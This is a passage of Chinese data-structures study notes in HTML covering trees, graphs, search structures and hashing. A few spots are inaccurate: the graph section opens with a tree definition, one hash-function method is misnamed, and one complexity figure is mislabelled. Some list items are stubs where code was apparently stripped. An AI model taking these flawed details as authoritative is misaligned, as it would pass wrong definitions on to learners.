href="#树的基本概念"></a>树的基本概念</h3><ul><li>树是递归定义的结构</li><li>结点<ul><li>根节点：树只有一个根结点</li><li>结点的度：结点拥有的子树的数量<ul><li>度为0：叶子结点或者终端结点</li><li>度不为0：分支结点或者非终端结点<ul><li>分支结点除去根结点也称为内部结点</li></ul></li></ul></li></ul></li><li>树的度：树中所有结点的度数的最大值</li><li>结点关系<ul><li>祖先结点<ul><li>根结点到该结点的唯一路径的任意结点</li></ul></li><li>子孙结点</li><li>双亲结点<ul><li>根结点到该结点的唯一路径上最接近该结点的结点</li></ul></li><li>孩子结点</li><li>兄弟结点<ul><li>有相同双亲结点的结点</li></ul></li></ul></li><li>层次，高度，深度，树的高度<ul><li>层次：根为第一层，它的孩子为第二层，以此类推</li><li>结点的深度：根结点开始自顶向下累加</li><li>结点的高度：叶节点开始自底向上累加</li><li>树的高度（深度）：树中结点的最大层数</li></ul></li><li>树的性质<ul><li>1.树中的结点数等于所有结点的度数加1。<ul><li>证明：不难想象，除根结点以外，每个结点有且仅有一个指向它的前驱结点。也就是说每个结点和指向它的分支一一对应。<br>假设树中一共有b个分支，那么除了根结点，整个树就包含有b个结点，所以整个树的结点数就是这b个结点加上根结点，设为n，则n=b+1。而分支数b也就是所有结点的度数，证毕。</li></ul></li><li>2.度为m的树中第i层上至多有m^(i−1)个结点（i≥1）。<ul><li>证明：（数学归纳法）<br>首先考虑i=1的情况：第一层只有根结点，即一个结点，i=1带入式子满足。<br>假设第i-1层满足这个性质，第i-1层最多有m i-2个结点。<br>……… …<br>i-1层<br>………<br>又因为树的度为m,所以对于第i-1层的每个结点，最多<br>有m个孩子结点。所以第i层的结点数最多是i-1层的m<br>倍，所以第i层上最多有m ^(i-1)个结点。</li></ul></li><li>3.高度为h的m叉树至多有(m^h-1)/(m-1)个结点</li><li>4.具有n个结点的m叉树的最小高度为logm(n(m-1)+1)</li></ul></li></ul><h3 id="树的存储结构"><a class="header-anchor" href="#树的存储结构"></a>树的存储结构</h3><ul><li>顺序存储结构<ul><li>双亲表示法：用一组连续的存储空间存储树的结点，同时在每个结点中，用一个变量存储该结点的双亲结点在数组中的位置。</li></ul></li><li>链式存储结构<ul><li><p>孩子表示法：把每个结点的孩子结点排列起来存储成一个单链表。所以n个结点就有n个链表；<br>如果是叶子结点，那这个结点的孩子单链表就是空的；<br>然后n个单链表的的头指针又存储在一个顺序表（数组）中。</p></li><li><p>孩子兄弟表示法：顾名思义就是要存储孩子和孩子结点的兄弟，具体来说，就是设置两个指针，分别指向该结<br>点的第一个孩子结点和这个孩子结点的右兄弟结点。</p></li></ul></li></ul><h3 id="二叉树"><a class="header-anchor" href="#二叉树"></a>二叉树</h3><ul><li>定义<ul><li>二叉树是n（n≥0）个结点的有限集合：<br>① 或者为空二叉树，即n=0。<br>② 或者由一个根结点和两个互不相交的被称为根的左子树<br>和右子树组成。左子树和右子树又分别是一棵二叉树。<ul><li>1.每个结点最多有两棵子树。</li><li>2.左右子树有顺序</li></ul></li></ul></li><li>二叉树的五种基本形态：<ul><li>1.空树</li><li>2.只有一个根结点</li><li>3.根结点只有左子树</li><li>4.根结点只有右子树</li><li>5.根结点既有左子树又有右子树</li></ul></li><li>特殊二叉树<ul><li>1.斜树</li><li>2.满二叉树:</li><li>3.完全二叉树</li></ul></li><li>二叉树的性质<ul><li>1.非空二叉树上叶子结点数等于度为2的结点数加1</li><li>2.非空二叉树上第K层上至多有2^k−1个结点（K≥1）</li><li>3.高度为H的二叉树至多有2^H-1个结点（H≥1）</li><li>4.具有N个（N&gt;0）结点的完全二叉树的高度为 [log2(N+1)]或[log2N] +1。</li></ul></li></ul><h3 id="二叉树的存储结构"><a class="header-anchor" href="#二叉树的存储结构"></a>二叉树的存储结构</h3><ul><li>顺序存储<ul><li>二叉树的顺序存储结构就是用一组地址连续的存储单元依次自上而下、自左至右存储完全二叉树上的结点元素。</li></ul></li><li>链式存储<ul><li>二叉树每个结点最多两个孩子，所以设计二叉树的结点结构时考虑两个指针指向该结点的两个孩子。</li></ul></li></ul><h3 id="二叉树的遍历"><a class="header-anchor" href="#二叉树的遍历"></a>二叉树的遍历</h3><ul><li>先序遍历：<br>1）访问根结点；<br>2）先序遍历左子树；<br>3）先序遍历右子树。<ul><li>递归</li><li>非递归</li></ul></li><li>中序遍历：<br>1）中序遍历左子树；<br>2）访问根结点；<br>3）中序遍历右子树。<ul><li>递归</li><li>非递归</li></ul></li><li>后序遍历：<br>1）后序遍历左子树；<br>2）后序遍历右子树；<br>3）访问根结点。<ul><li>递归</li><li>非递归</li></ul></li><li>层次遍历：<br>若树为空，则什么都不做直接返回。<br>否则从树的第一层开始访问，从上而下逐层遍历，在同一层中，按从左到右的顺序对结点逐个访问。</li></ul><h3 id="线索二叉树"><a class="header-anchor" href="#线索二叉树"></a>线索二叉树</h3><ul><li><p>N个结点的二叉链表，每个结点都有指向左右孩子的<br>结点指针，所以一共有2N个指针，而N个结点的二叉<br>树一共有N-1条分支，也就是说存在2N-(N-1)=N+1个空指针。比如左图二叉树中有6个结点，那么就有7个空<br>指针。</p></li><li><p>大量的空余指针能否利用起来？</p><ul><li>指向前驱和后继的指针称为线索，加上线索的二叉链表就称为线索链表，相应的二叉树就称为线索二叉树</li><li>对二叉树以某种次序遍历使其变为线索二叉树的过程就叫做线索化</li></ul></li></ul><h3 id="哈夫曼树和哈夫曼编码"><a class="header-anchor" href="#哈夫曼树和哈夫曼编码"></a>哈夫曼树和哈夫曼编码</h3><ul><li>算法的描述如下：<br>1）将这N个结点分别作为N棵仅含一个结点的二叉树，构成森林F。<br>2）构造一个新结点，并从F中选取两棵根结点权值最小的树作为新结点的左、右子树，并且将新结点的权值<br>置为左、右子树上根结点的权值之和。<br>3）从F中删除刚才选出的两棵树，同时将新得到的树加入F中。<br>4）重复步骤2）和3），直至F中只剩下一棵树为止。</li></ul><h2 id="第五章：图"><a class="header-anchor" href="#第五章：图"></a>第五章：图</h2><h3 id="图的基本概念"><a class="header-anchor" href="#图的基本概念"></a>图的基本概念</h3><ul><li>定义：<br>树是N（N≥0）个结点的有限集合，N=0时，称为空树，这是一种特殊情况。在任意一棵非空树中应满足：<br>1）有且仅有一个特定的称为根的结点。<br>2）当N&gt;1时，其余结点可分为m（m&gt;0）个互不相交的有限集合T1，T2，…，Tm，其中每一个集合本身又是一棵树，并且称为根结点的子树。<ul><li>图G由顶点集V和边集E组成，记为G=(V，E)<ul><li>V(G)表示图G中顶点的有限非空集。<br>用|V|表示图G中顶点的个数，也称为图G的阶</li><li>E(G)表示图G中顶点之间的关系（边）集合。<br>用|E|表示图G中边的条数。</li></ul></li></ul></li><li>分类<ul><li>有向图<ul><li>有向边（弧）的有限集合<ul><li>弧是顶点的有序对</li><li>&lt;v,w&gt;</li><li>v是弧尾，w是弧头</li><li>v邻接到w或w邻接自v</li></ul></li></ul></li><li>无向图<ul><li>无向边的有限集合<ul><li>边是顶点的无序对</li><li>（v,w）</li><li>（v,w）=(w,v)</li><li>w，v互为邻接点</li></ul></li></ul></li></ul></li><li>简单图<ul><li>1.不存在顶点到自身的边</li><li>2.同一条边不重复出现</li></ul></li><li>多重图<ul><li>若图G中某两个结点之间的边数多于一条，又允许顶点通过通过同一个边和自己关联</li></ul></li><li>完全图<ul><li>无向完全图<ul><li>如果任意两个顶点之间都存在边</li></ul></li><li>有向完全图<ul><li>如果任意两个顶点之间都存在方向相反的两条弧</li></ul></li></ul></li><li>子图</li><li>连通图：图中任意两个顶点都是连通的</li><li>连通分量：无向图中的极大连通子图<ul><li>连通<ul><li>顶点A到顶点B有路径</li></ul></li><li>极大<ul><li>1.顶点足够多</li><li>2.极大连通子图包含这些依附这些顶点的所有边</li></ul></li><li>结论1:如果一个图有n个顶点，并且有小于n-1条边，则此图必是非连通图。</li><li>概要: 找连通分量的方法：<br>从选取一个顶点开始，以这个顶点作为一个子图，然后逐个添加与这个子图相连的顶点和边直到所有相连的顶点都加入该子图</li></ul></li><li>强连通：顶点V到顶点W和顶点W到顶点V都有路径</li><li>强连通图：图中任一对顶点都是强连通的</li><li>连通图的生成树：包含图中全部n个顶点，但是只有n-1条边的极小连通子图<ul><li>结论2:生成树去掉一条边则变成非连通图，加上一条边就会形成回路。</li></ul></li><li>度：以该顶点为一个端点的边数目<ul><li>无向图中顶点V的度是指依附于该顶点的边的条数，记为TD(v)</li><li>有向图中顶点V的度分为出度和入度<ul><li>入度（ID）是以顶点v为终点的有向边的数目</li><li>出度（OD）是以顶点V为起点的有向边的数目</li></ul></li></ul></li><li>简单路径和简单回路：顶点不重复出现的路径称为简单路径。对于回路，除了第一个和最后一个顶点其余顶点不重复出现的回路称为简单回路</li><li>权和网：图中每条边考研赋予一定意义的数值，这个数值叫做这条边的权，有权值得图称为带权图，也叫做网</li><li>路径和路径长度：顶点p到q之间的路径是指顶点序列怕保存的，p,a,b,c,d,……q。路径上边的数目就是路径长度</li><li>回路（环）：第一个和最后一个顶点相同的路径称为回路或者环</li><li>距离：从顶点u到v的最短路径长度。不存在路径则为无穷</li></ul><h3 id="图的存储结构"><a class="header-anchor" href="#图的存储结构"></a>图的存储结构</h3><ul><li>邻接矩阵（顺序存储）</li><li>邻接表（链式存储）<ul><li>十字链表（有向图）</li><li>邻接多重表（无向图）</li></ul></li></ul><h3 id="图的遍历"><a class="header-anchor" href="#图的遍历"></a>图的遍历</h3><ul><li>深度优先遍历<ul><li>深度优先搜索(DFS:Depth-First-Search):深度优先搜索类似于树的先序遍历算法<ul><li>空间复杂度：由于DFS是一个递归算法，递归是需要一个工作栈来辅助工作，最多需要图中所有顶点进栈，所以时间复杂度为O(|V|)</li><li>时间复杂度：1)邻接表：遍历过程的主要操作是对顶点遍历它的邻接点，由于通过访问边表来查找邻接点，所以时间复杂度为O(|E|),访问顶点时间为O(|V|),所以总的时间复杂度为O(|V|+|E|)<br>2)邻接矩阵：查找每个顶点的邻接点时间复杂度为O(|V|),对每个顶点都进行查找，所以总的时间复杂度为O(|V|2)</li></ul></li></ul></li><li>广度优先遍历<ul><li>广度优先搜索(BFS:Breadth-First-Search):广度优先搜索类似于树的层序遍历算法<ul><li>空间复杂度：BFS需要借助一个队列，n个顶点均需要入队一次，所以最坏情况下n个顶点在队列，那么则需要O(|V|)的空间复杂度。</li><li>时间复杂度：<br>1)邻接表：每个顶点入队一次，时间复杂度为O(|V|),对于每个顶点，搜索它的邻接点，就需要访问这个顶点的所有边，所以时间复杂度为O(|E|)。所以总的时间复杂度为O(|V|+|E|)<br>2)邻接矩阵：每个顶点入队一次，时间复杂度为O(|V|),对于每个顶点，搜索它的邻接点，需要遍历一遍矩阵的一行，所以时间复杂度为O(|V|),所以总的时间复杂度为O(|V|2)</li></ul></li></ul></li></ul><h3 id="图的应用"><a class="header-anchor" href="#图的应用"></a>图的应用</h3><ul><li>最小生成树<ul><li>普利姆（Prlm）<ul><li>①从图中找第一个起始顶点v0，作为生成树的第一个顶点，然后从这个顶点到其他顶点的所有边中选一条权值最小的边。然后把这条边的另一个顶点v和这条边加入到生成树中。</li><li>②对剩下的其他所有顶点，分别检查这些顶点与顶点v的权值是否比这些顶点在lowcost数组中对应的权值小，如果更小，则用较小的权值更新lowcost数组。</li><li>③从更新后的lowcost数组中继续挑选权值最小而且不在生成树中的边，然后加入到生成树。</li><li>④反复执行②③直到所有所有顶点都加入到生成树中。</li><li>概要:<ul><li>双重循环，外层循环次数为n-1，内层并列的两个循环次数都是n。故普利姆算法时间复杂度为O(n2)<br>而且时间复杂度只和n有关，所以适合稠密图</li></ul></li></ul></li><li>克鲁斯卡尔（Kruskal）<ul><li>将图中边按照权值从小到大排列，然后从最小的边开始扫描，设置一个边的集合来记录，如果该边并入不构成回路的话，则将该边并入当前生成树。直到所有的边都检测完为止。</li><li>概要:<br>*<br>*<ul><li>概要: 克鲁斯卡尔算法操作分为对边的权值排序部分和一个单重for循环，它们是并列关系，由于排序耗费时间大于单重循环，所以克鲁斯卡尔算法的主要时间耗费在排序上。排序和图中边的数量有关系，所以适合稀疏图</li></ul></li></ul></li></ul></li><li>最短路径<ul><li>迪杰斯特拉<ul><li>一个源点到其余顶点的最短路径<ul><li>该算法设置一个集合S记录已求得的最短路径的顶点，可用一个数组s[]来实现，初始化为0，当s[vi]=1时表示将顶点vi放入S中，初始时把源点v0放入S中。此外，在构造过程中还设置了两个辅助数组：<br>dist[]：记录了从源点v0到其他各顶点当前的最短路径长度，dist[i]初值为arcs[v0][i]。<br>path[]：path[i]表示从源点到顶点i之间的最短路径的前驱结点，在算法结束时，可根据其值追溯得到源点v0到顶点vi的最短路径。</li></ul></li></ul></li></ul></li></ul><p>假设从顶点0出发，也就是顶点0为源点，集合S最初只包含顶点0，邻接矩阵arcs表示带权有向图，arcs[i][j]表示有向边&lt;i，j&gt;的权值，若不存在有向边&lt;i，j&gt;，则arcs[i][j]为∞。Dijkstra算法的步骤如下：<br>1）初始化：集合S初始为{0}，dist[]的初始值dist[i]=arcs[0][i]，i=1，2，…，n-1。<br>2）找出dist[]中的最小值dist[j]，将顶点j加入集合S，即修改s[vj]=1。<br>3）修改从v0出发到集合V-S上任一顶点vk可达的最短路径长度：如果dist[j] + arcs[j][k]&lt; dist[k]，则令dist[k]=dist[j] + arcs[j][k]。另外更新path[k]=j(也就是顶点j加入集合之后如果有新的路径使得到顶点k路径变短的话就将到顶点k的路径长度修改成较短的)<br>4）重复2）～3）操作共n-1次，直到所有的顶点都包含在S中。<br>* 弗洛伊德<br>* 所有顶点到所有顶点的最短路径<br>* 算法思想：<br>递推产生一个n阶方阵序列A(−1)，A(0)，…，A(k)，…，A(n−1)<br>其中A(k)[i][j]表示从顶点vi到顶点vj的路径长度，k表示绕行第k个顶点的运算步骤。初始时，对于任意两个顶点vi和vj，若它们之间存在边，则以此边上的权值作为它们之间的最短路径长度；若它们之间不存在有向边，则以∞作为它们之间的最短路径长度。以后逐步尝试在原路径中加入顶点k(k=0，1，…，n-1)作为中间顶点。如果增加中间顶点后，得到的路径比原来的路径长度减少了，则以此新路径代替原路径<br>* 非带权图<br>* 两点之间经过边数最少的路径<br>* 带权图<br>* 两点之间经过的边上权值之和最小的路径</p><ul><li><p>拓扑排序</p><ul><li><p>AOV</p><ul><li>如果我们把每个环节看成图中一个顶点，在这样一个有向图中，用顶点表示活动，用弧表示活动之间的优先关系，那么这样的有向图称为AOV网(Activity On Vertex)</li></ul></li><li><p>拓扑排序就是对一个有向图构造拓扑序列的过程，构造会有两种结果：<br>如果此图全部顶点都被输出了，说明它是不存在回路的AOV网；<br>如果没有输出全部顶点，则说明这个图存在回路，不是AOV网。</p></li><li><p>拓扑排序算法：<br>从AOV网中选择一个入度为0的顶点输出，然后删去此顶点，并删除以此顶点为弧尾的弧。重复这个步骤直到输出图中全部顶点，或者找不到入度为0的顶点为止。</p></li></ul></li><li><p>关键路径</p><ul><li>AOE(Activity On Edge):在一个表示工程的带权有向图中，用顶点表示事件，用有向边表示活动，用边上的权值表示活动的持续时间，这种有向图的边表示活动的网称为AOE网。</li></ul></li></ul><h2 id="第六章：查找"><a class="header-anchor" href="#第六章：查找"></a>第六章：查找</h2><h3 id="查找的基本概念和顺序查找"><a class="header-anchor" href="#查找的基本概念和顺序查找"></a>查找的基本概念和顺序查找</h3><ul><li>查找定义：在数据集合中寻找满足某种条件的数据元素的过程称为查找</li><li>关键字：数据元素中某个可以以唯一标识该元素的数据项</li><li>平均查找长度（ASL：Average Search Length）:在查找的过程中，一次查找的长度是指需要比较的关键字次数，而平均查找长度则是所有查找过程中进行关键字的比较次数的平均值</li><li>顺序查找(线性查找)，主要用于在线性表中进行查找。从查找表的一端开始，顺序扫描查找表，依次将扫描到的关键字和待查找的值key进行比较。如果相等，则查找成功。如果扫描结束仍然没有发现相等的数据元素，则查找失败。<ul><li>1</li><li>2</li><li>3</li><li>4</li><li>时间复杂度为O(n)</li></ul></li></ul><h3 id="折半查找"><a class="header-anchor" href="#折半查找"></a>折半查找</h3><ul><li>算法思路：<ul><li>首先将给定值key与表中中间位置元素的关键字比较，若相等，则查找成功，返回该元素的存储位置；若不等，则所需查找的元素只能在中间元素以外的前半部分或后半部分中。然后在缩小的范围内继续进行同样的查找，如此重复直到找到为止，或者确定表中没有所需要查找的元素，则查找不成功，返回查找失败的信息。</li></ul></li><li>折半查找分析<ul><li>折半查找判定树<ul><li>对于折半查找，查找的比较次数就是从根结点到该结点经历的结点数</li><li>时间复杂度为O(logn)</li><li>概要: 具有N个（N&gt;0）结点的完全二叉树的高度为 [log2(N+1)] 或 [log2N] +1。</li></ul></li></ul></li></ul><h3 id="分块查找"><a class="header-anchor" href="#分块查找"></a>分块查找</h3><ul><li>分块查找又称为索引顺序查找</li><li>分块查找思想：<ul><li>①确定待查找值在哪个块（折半查找）</li></ul></li></ul><p>②在确定的块中查找待查找值（顺序查找）</p><ul><li>分块查找分析<ul><li>由于分块查找实际是进行两次查找，所以整个算法的平均查找长度是两次查找的平均查找长度之和。<br>即ASL分块=ASL折半+ASL顺序<br>*</li></ul></li></ul><h3 id="二叉排序树"><a class="header-anchor" href="#二叉排序树"></a>二叉排序树</h3><ul><li>二叉排序树(Binary Search Tree 也叫二叉搜索树)或者是一棵空树，或者是具有以下性质的二叉树<br>①若左子树不空，则左子树上所有结点的值均小于它的根结点的值。<br>②若右子树不空，则右子树上所有结点的值均大于它的根结点的值。<br>③它的左右子树也是一棵二叉排序树。</li><li>算法思想<ul><li>由于二叉排序树的特点(左子树&lt;根结点&lt;右子树),所以每次查找一个关键字，需要先和根结点进行比较：<br>如果这个关键字小于根结点的值，则再到这个根结点的左子树进行同样的比较操作一直进行下去直到找到该关键字，表示查找成功，或者是空指针，表示查找失败。<br>如果这个关键字大于根结点的值，则再到这个根结点的右子树进行同样的比较操作一直进行下去直到找到该关键字，表示查找成功，或者是空指针，表示查找失败。<ul><li>查找关键字代码<ul><li>1</li><li>2</li></ul></li><li>插入关键字代码<ul><li>1)空树：直接插入新结点返回成功<br>2)树不空：检查是否存在关键字重复的结点：<br>①存在：返回插入失败<br>②不存在：检查根结点的值和待插入关键字值的大小关系递归插入左右子树</li><li></li></ul></li><li>构造代码<br>*</li><li>删除结点<ul><li>①删除的是叶子结点<ul><li>方法：直接删去该结点即可</li></ul></li><li>②删除的是仅有左子树或者右子树的结点<ul><li>方法：“子承父业”</li></ul></li><li>③删除的是左右子树都有的结点<ul><li>仿照②类型，先将一个孩子“继承父业”，另一个孩子“归顺”于这个孩子<br>方法：找到待删除结点的直接前驱或者直接后继结点，用该结点来替换待删除结点，再删除该结点。</li></ul></li></ul></li></ul></li></ul></li><li>二叉排序树分析<ul><li>查找时间复杂度是O(n)</li></ul></li><li>概要: “左小右大”</li></ul><h3 id="平衡二叉树-AVL树"><a class="header-anchor" href="#平衡二叉树-AVL树"></a>平衡二叉树(AVL树)</h3><ul><li>平衡二叉树(AVL树)是特殊的二叉排序树，特殊的地方在于左右子树的高度之差绝对值不超过1，而且左右子树又是一棵平衡二叉树。</li><li>平衡因子<ul><li>定义结点左子树与右子树的高度差为该结点的平衡因子，则平衡二叉树结点的平衡因子的值只可能是−1、0或1。</li></ul></li><li>平衡调整<ul><li><p>平衡二叉树的建立过程和二叉排序树的建立过程是相似的，都是从一棵空树开始陆续插入结点。不同的地方在于对于平衡二叉树的建立过程中，由于插入结点可能会破坏结点的平衡性，所以需要进行平衡调整。</p><ul><li>LL调整(左孩子的左子树上插入结点导致)<ul><li>最小不平衡子树根结点的平衡因子为2&gt;0<br>它的左孩子结点平衡因子为1&gt;0<br>两个都大于0，所以直接右旋就可以调整</li><li>概要: “正则右旋”</li></ul></li><li>RR调整(右孩子的右子树上插入结点导致)<ul><li>最小不平衡子树根结点的平衡因子为-2&lt;0<br>它的右孩子结点平衡因子为-1&lt;0<br>两个都小于0，所以直接左旋就可以调整</li><li>概要: “负则左旋”</li></ul></li><li>LR调整(左孩子的右子树上插入结点导致)</li><li>RL调整(右孩子的左子树上插入结点导致)</li><li>概要: 先局部转换为LL或RR，最后进行调整</li></ul></li></ul></li><li>分析<ul><li>含有n个结点平衡二叉树的最大深度为O(log2n)，因此，平衡二叉树的平均查找长度为O(log2n)</li></ul></li></ul><h3 id="B树和B-树"><a class="header-anchor" href="#B树和B-树"></a>B树和B+树</h3><ul><li>2-3树<ul><li>2-3树是一种多路查找树：2和3的意思就是2-3树包含两种结点<ul><li>1)2结点包含一个元素和两个孩子(或者没有孩子)。<br>①左子树包含的元素小于该结点的元素值，右子树包含的元素大于该结点的元素值<br>②2结点要不有两个孩子，要不就没有孩子，不允许有一个孩子</li><li>2)3结点包含一大一小两个元素和三个孩子(或者没有孩子)。(两个元素按大小顺序排列好)<br>①左子树包含的元素小于该结点较小的元素值，右子树包含的元素大于该结点较大的元素值，中间子树包含的元素介于这两个元素值之间。<br>②3结点要不有三个孩子，要不就没有孩子，不允许有一个或两个孩子</li><li>3)2-3树所有叶子结点都在同一层次</li></ul></li></ul></li><li>2-3-4树<ul><li>2-3-4树也是一种多路查找树：2和3和4的意思就是2-3-4树包含三种结点<ul><li>1)2结点包含一个元素和两个孩子(或者没有孩子)。<br>①左子树包含的元素小于该结点的元素值，右子树包含的元素大于该结点的元素值<br>②2结点要不有两个孩子，要不就没有孩子，不允许有一个孩子</li><li>2)3结点包含一大一小两个元素和三个孩子(或者没有孩子)。<br>①左子树包含的元素小于该结点较小的元素值，右子树包含的元素大于该结点较大的元素值，中间子树包含的元素介于这两个元素值之间。<br>②3结点要不有三个孩子，要不就没有孩子，不允许有一个或两个孩子</li><li>3)4结点包含小中大三个元素和四个孩子(或者没有孩子)。<br>①左子树包含的元素小于该结点最小的元素值，第二个子树包含大于最小的元素值小于中间元素值的元素，第三个子树包含大于中间元素值小于最大元素值的元素，右子树包含的元素大于该结点最大的元素值。<br>②4结点要不有四个孩子，要不就没有孩子，不允许有一个或两个或三个孩子</li><li>4)2-3-4树所有叶子结点都在同一层次</li></ul></li></ul></li><li>B树<ul><li><p>B树也是一种平衡的多路查找树，2-3树和2-3-4树都是B树的特例，我们把树中结点最大的孩子数目称为B树的阶。通常记为m。<br>一棵m阶B树或为空树，或为满足如下特性的m叉树：</p><ul><li>1）树中每个结点至多有m棵子树。（即至多含有m-1个关键字) (“两棵子树指针夹着一个关键字”)</li><li>2）若根结点不是终端结点，则至少有两棵子树。(至少一个关键字)</li><li>3）除根结点外的所有非叶结点至少有 ⌈m/2⌉棵子树。（即至少含有⌈m/2⌉-1个关键字）</li><li>4）所有非叶结点的结构如下：</li><li>5）所有的叶子结点出现在同一层次上，不带信息。(就像是折半查找判断树中查找失败的结点)</li></ul></li><li><p>1.B树的查找操作</p><ul><li>查找过程：①先让待查找关键字key和结点的中的关键字比较，如果等于其中某个关键字，则查找成功。<br>②如果和所有关键字都不相等，则看key处在哪个范围内，然后去对应的指针所指向的子树中查找。<br>Eg:如果Key比第一个关键字K1还小，则去P0指针所指向的子树中查找，如果比最后一个关键字Kn还大，则去Pn指针所指向的子树中查找。</li></ul></li><li><p>2.B树的插入操作</p><ul><li>分裂的方法：取这个关键字数组中的中间关键字(⌈n/2⌉)作为新的结点，然后其他关键字形成两个结点作为新结点的左右孩子。</li></ul></li><li><p>3.B树的删除操作</p><ul><li>B树中的删除操作与插入操作类似，但要稍微复杂些，要使得删除后的结点中的关键字个数≥⌈m/2⌉-1 ，因此将涉及结点的“合并”问题。由于删除的关键字位置不同，可以分为关键字在终端结点和不在终端结点上两种情况。<ul><li><p>1）如果删除的关键字在终端结点上（最底层非叶子结点）：<br>①结点内关键字数量大于⌈m/2⌉-1 ，这时删除这个关键字不会破坏B树的定义要求。所以直接删除。<br>②结点内关键字数量等于⌈m/2⌉-1 ，并且其左右兄弟结点中存在关键字数量大于⌈m/2⌉-1 的结点，则去兄弟阶段中借关键字。<br>③结点内关键字数量等于⌈m/2⌉-1 ，并且其左右兄弟结点中不存在关键字数量大于⌈m/2⌉-1 的结点，则需要进行结点合并。</p></li><li><p>2）如果删除的关键字不在终端结点上（最底层非叶子结点）：需要先转换成在终端结点上，再按照在终端结点     上的情况来分别考虑对应的方法。</p><ul><li>相邻关键字：对于不在终端结点上的关键字,它的相邻关键字是其左子树中值最大的关键字或者右子树中值最小的关键字。</li><li>第一种情况：存在关键字数量大于⌈m/2⌉-1 的左子树或者右子树，在对应子树上找到该关键字的相邻关键字，然后将相邻关键字替换待删除的关键字。</li><li>第二种情况：左右子树的关键字数量均等于⌈m/2⌉-1 ，则将这两个左右子树结点合并，然后删除待删除关键字。</li></ul></li></ul></li></ul></li></ul></li><li>B+树<ul><li>B+树是常用于数据库和操作系统的文件系统中的一种用于查找的数据结构</li><li>m阶的B+树与m阶的B树的主要差异在于：<br>1）在B+树中，具有n个关键字的结点只含有n棵子树，即每个关键字对应一棵子树；而在B树中，具有n个关键字的结点含有(n+1)棵子树。<br>2）在B+树中，每个结点（非根内部结点）关键字个数n的范围是 ⌈m/2⌉≤n≤m（根结点1≤n≤m），在B树中，每个结点（非根内部结点）关键字个数n的范围是⌈m/2⌉ -1≤n≤m-1（根结点：1≤n≤m-1）。<br>3）在B+树中，叶结点包含信息，所有非叶结点仅起到索引作用，非叶结点中的每个索引项只含有对应子树的最大关键字和指向该子树的指针，不含有该关键字对应记录的存储地址。<br>4）在B+树中，叶结点包含了全部关键字，即在非叶结点中出现的关键字也会出现在叶结点中；而在B树中，叶结点包含的关键字和其他结点包含的关键字是不重复的。</li></ul></li></ul><h3 id="散列表"><a class="header-anchor" href="#散列表"></a>散列表</h3><ul><li><p>散列表：根据给定的关键字来计算出关键字在表中的地址的数据结构。也就是说，散列表建立了关键字和存储地址之间的一种直接映射关系。</p></li><li><p>散列函数：一个把查找表中的关键字映射成该关键字对应的地址的函数，记为Hash(key)=Addr。</p></li><li><p>散列函数可能会把两个或两个以上的不同关键字映射到同一地址，称这种情况为“冲突”，这些发生碰撞的不同关键字称为同义词。</p></li><li><p>构造散列函数的tips：</p><ul><li>1）散列函数的定义域必须包含全部需要存储的关键字，而值域的范围则依赖于散列表的大小或地址范围。</li><li>2）散列函数计算出来的地址应该能等概率、均匀地分布在整个地址空间，从而减少冲突的发生。</li><li>3）散列函数应尽量简单，能够在较短的时间内就计算出任一关键字对应的散列地址。</li></ul></li><li><p>1.常用Hash函数的构造方法：</p><ul><li>1.开放定址法：直接取关键字的某个线性函数值为散列地址，散列函数为H(key)=a×key+b。式中，a和b是常数。这种方法计算最简单，并且不会产生冲突</li><li>2.除留余数法：假定散列表表长为m，取一个不大于m但最接近或等于m的质数p，利用以下公式把关键字转换成散列地址。散列函数为H(key)=key % p<br>除留余数法的关键是选好p，使得每一个关键字通过该函数转换后等概率地映射到散列空间上的任一地址，从而尽可能减少冲突的可能性</li><li>3.数字分析法：设关键字是r进制数（如十进制数），而r个数码在各位上出现的频率不一定相同，可能在某些位上分布均匀些，每种数码出现的机会均等；而在某些位上分布不均匀，只有某几种数码经常出现，则应选取数码分布较为均匀的若干位作为散列地址。这种方法适合于已知的关键字集合</li><li>4.平方取中法：顾名思义，取关键字的平方值的中间几位作为散列地址。具体取多少位要看实际情况而定。这种方法得到的散列地址与关键字的每一位都有关系，使得散列地址分布比较均匀。</li><li>5.折叠法：将关键字分割成位数相同的几部分（最后一部分的位数可以短一些），然后取这几部分的叠加和作为散列地址，这种方法称为折叠法。关键字位数很多，而且关键字中每一位上数字分布大致均匀时，可以采用折叠法得到散列地址。</li></ul></li><li><p>2.常用Hash函数的冲突处理办法：</p><ul><li>1.开放定址法：将产生冲突的Hash地址作为自变量，通过某种冲突解决函数得到一个新的空闲的Hash地址。<ul><li>1）线性探测法：冲突发生时，顺序查看表中下一个单元（当探测到表尾地址m-1时，下一个探测地址是表首地址0），直到找出一个空闲单元（当表未填满时一定能找到一个空闲单元）或查遍全表。</li><li>2）平方探测法：设发生冲突的地址为d,平方探测法得到的新的地址序列为d+12，d-12，d+22，d-22…<br>平方探测法是一种较好的处理冲突的方法，可以避免出现“堆积”问题，它的缺点是不能探测到散列表上的所有单元，但至少能探测到一半单元。</li><li>3）再散列法：又称为双散列法。需要使用两个散列函数，当通过第一个散列函数H(Key)得到的地址发生冲突时，则利用第二个散列函数Hash2(Key)计算该关键字的地址增量。</li><li>4）伪随机序列法：当发生地址冲突时，地址增量为伪随机数序列，称为伪随机序列法。</li></ul></li><li>2.拉链法：对于不同的关键字可能会通过散列函数映射到同一地址，为了避免非同义词发生冲突，可以把所有的同义词存储在一个线性链表中，这个线性链表由其散列地址唯一标识。拉链法适用于经常进行插入和删除的情况。</li><li>3.散列表的查找过程：类似于构造散列表，给定一个关键字Key。<br>先根据散列函数计算出其散列地址。然后检查散列地址位置有没有关键字。<br>1)如果没有，表明该关键字不存在，返回查找失败。<br>2)如果有，则检查该记录是否等于关键字。<br>①如果等于关键字，返回查找成功。<br>②如果不等于，则按照给定的冲突处理办法来计算下一个散列地址，再用该地址去执行上述过程。</li><li>4.散列表的查找性能：和装填因子有关。<br>*<ul><li>α越大，表示装填的记录越“满”，发生冲突的可能性就越大，反之发生冲突的可能性越小</li></ul></li></ul></li></ul><h2 id="第七章：排序"><a class="header-anchor" href="#第七章：排序"></a>第七章：排序</h2><h3 id="排序的基本知识"><a class="header-anchor" href="#排序的基本知识"></a>排序的基本知识</h3><ul><li>定义：排序就是将原本无序的序列重新排列成有序的序列。</li><li>排序的稳定性<ul><li>如果待排序表中有两个元素Ri、Rj，其对应的关键字keyi=keyj，且在排序前Ri在Rj前面，如果使用某一排序算法排序后，Ri仍然在Rj的前面，则称这个排序算法是稳定的，否则称排序算法是不稳定的。</li></ul></li></ul><h3 id="插入类排序"><a class="header-anchor" 